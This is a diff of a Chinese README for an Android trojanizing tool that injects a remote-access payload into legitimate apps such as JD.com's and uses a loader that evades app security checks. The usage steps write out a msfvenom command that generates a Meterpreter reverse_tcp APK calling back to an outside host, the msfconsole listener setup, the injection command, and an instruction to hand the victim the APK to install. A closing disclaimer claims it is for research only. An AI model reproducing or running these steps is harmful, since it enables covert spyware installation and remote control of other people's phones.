@@ -2,13 +2,13 @@
 
 ## 介绍
 
-* 将编写的安卓远控程序，注入到正常的app中，运行app时安卓远控程序也会上线。
+* 将编写的安卓远控程序，注入到正常的App中，运行app时安卓远控程序也会上线。
 
-* 修复上一版本的bug，使用java重写，同时还重写了520ApkBox程序，专门用来运行运行APP和远控app。
+* 修复上一版本的bug，使用java重写，同时还重写了520ApkBox程序，专门用来运行运行APP和远控App。
 
-* 520ApkBox是一个java编写的app，主要作用是一个安卓虚拟机，可以不用任何修改就可以用来运行正常的app，可以绕过现在各种app的安全检测。同时此app还是一个加载器，通过DexClassesLoder加载远控的dex文件并启动。
+* 520ApkBox是一个java编写的App，主要作用是一个安卓虚拟机，任何App可以不用任何修改就可以正常运行，可以绕过现在各种App的安全检测。同时此App还是一个加载器，通过DexClassesLoder加载远控的Dex文件并启动上线。
 
-* 520ApkHook是java编写的注入工具，将被注入的app和远控app注入到一个app中。
+* 520ApkHook是Java编写的注入工具，将被注入的App和远控App注入到一个App中。
 
 * 项目地址:  [https://github.com/ba0gu0/520apkhook](https://github.com/ba0gu0/520apkhook)
 
@@ -26,14 +26,18 @@
 
 ## 使用
 
-1. msfmsfvenom
+1. 下载Releases中打包好的jar包  
+
+ * [a520ApkHook-1.0-jar-with-dependencies.jar](https://github.com/ba0gu0/520apkhook/releases/download/v2.0/a520ApkHook-1.0-jar-with-dependencies.jar)
+
+2. msfmsfvenom
 
 ```shell
 
 msfvenom -p android/meterpreter/reverse_tcp lhost=114.114.114.114 lport=3306 -o ~/Downloads/msf.apk
 
 ```
-2. msfconsole
+3. msfconsole
 
 ```shell
 # 启动 msfconsole
@@ -46,7 +50,7 @@ set exitonsession false
 exploit -j
 
 ```
-3. 520ApkHook
+4. 520ApkHook
 
 ```shell
 
@@ -54,7 +58,7 @@ java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Do
 
 ```
 
-4. BaoGuo仍给你一个Apk，请安装它!
+5. BaoGuo仍给你一个Apk，请安装它!
 
 ### 搭配其他远控使用
 
@@ -71,6 +75,16 @@ java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Do
   *  [https://github.com/wishihab/Android-RATList](https://github.com/wishihab/Android-RATList)
 
 
+## BUG
+
+* 微信只能通过应用克隆的方式安装，需要先指定微信的apk包，生成520ApkHook.apk. 再使用np管理器把assets目录下的和微信大小一样的文件给删除掉。（这种方法要求目标机器上要已经安装微信.）
+
+* 新生成的apk的包名字, 不能和被注入的apk包名字一样, 程序默认已经修改.
+
+* msf无法在鸿蒙OS使用, 文件读取在鸿蒙OS上也无法正常使用.
+
+* 其他未测试...
+
 ## 项目依赖
 
 * 本项目参考以下项目
@@ -82,4 +96,4 @@ java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Do
 
 * 本项目仅用于安全研究, 禁止利用脚本进行攻击, 使用本脚本产生的一切问题和本人无关.
 
-* 由于此软件是基于安卓虚拟化来实现的，虚拟化软件对于不同版本的系统会出现BUG，可以自行修改520ApkBox项目源码(欢迎大佬提交pull) .
+* 由于此软件是基于安卓虚拟化来实现的，虚拟化软件对于不同版本的系统会出现BUG，可以自行修改520ApkBox项目源码 (欢迎大佬提交pull) .
